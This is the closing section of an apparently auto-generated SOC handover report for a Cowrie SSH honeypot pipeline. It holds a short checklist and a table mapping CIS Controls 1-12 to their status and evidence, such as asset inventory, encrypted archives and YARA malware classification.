- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-17T04:47:52Z_
